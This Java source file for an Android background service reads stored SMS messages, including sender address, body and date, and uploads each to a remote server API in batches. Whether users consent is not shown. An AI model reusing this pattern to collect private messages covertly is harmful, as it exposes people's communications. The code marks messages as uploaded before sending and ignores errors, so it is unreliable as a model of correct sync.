package zaifsenpai.prs.General;

import android.app.IntentService;
import android.arch.persistence.room.Room;
import android.content.Intent;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsUploadService extends IntentService {
    private SmsDatabase smsDatabase;
    RequestQueue SmsUploadRequestQueue;

    public SmsUploadService() {
        this("SmsUploadService");
    }

    public SmsUploadService(String name) {
        super(name);
    }

    @Override
    protected void onHandleIntent(Intent workIntent) {
        smsDatabase = Room.databaseBuilder(SmsUploadService.this,
                SmsDatabase.class,
                _Properties.GET_DATABASE_PATH(SmsUploadService.this))
                .build();
        SmsUploadRequestQueue = Volley.newRequestQueue(SmsUploadService.this);
        Log.d(_Properties.LOG_TAG, "Starting uploading... ");
        UploadSMS();
        Log.d(_Properties.LOG_TAG, "Uploading Stopped...");
    }

    private void UploadSMS() {
        int n;

        while ((n = smsDatabase.smsDao().GetNonUploadedSmsCount()) > 0) {
            List<Sms> smsList = smsDatabase.smsDao().GetFirstNSmsNotUploaded(10);

            UploadSmsList(smsList);

            try {
                Thread.sleep(5000);
            } catch (Exception ignored) {
            }
        }
    }

    private void UploadSmsList(List<Sms> smsList) {
        // Sending a POST request with json data
        JsonObjectRequest jsonRequest;
        JSONObject jsonObject;

        Log.d(_Properties.LOG_TAG, "Starting to upload sms. Total number of sms to upload in this session: " + smsList.size());
        for (Sms sms : smsList) {
            final Sms _sms = sms;

            jsonObject = new JSONObject();
            try {
                jsonObject.put("Sms_ID", sms.Sms_ID);
                jsonObject.put("Sms_ID_Source", _sms.Sms_ID_Source);
                jsonObject.put("Address", _sms.Address);
                jsonObject.put("Body", _sms.Body);
                jsonObject.put("Date", _sms.Date);
            } catch (JSONException e) {
                continue;
            }

            jsonRequest = new JsonObjectRequest(Request.Method.POST,
                    _Properties.SERVER_API_ADDRESS,
                    jsonObject,
                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {

                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {

                }
            }) {
                @Override
                public Map<String, String> getHeaders() {
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Content-Type", "application/json");
                    return headers;
                }
            };

            Log.d(_Properties.LOG_TAG, "Successfully sent POST request for sms id: " + _sms.Sms_ID);
            _sms.IsUploaded = true;
            smsDatabase.smsDao().updateSms(_sms);
            SmsUploadRequestQueue.add(jsonRequest);
        }
    }
}
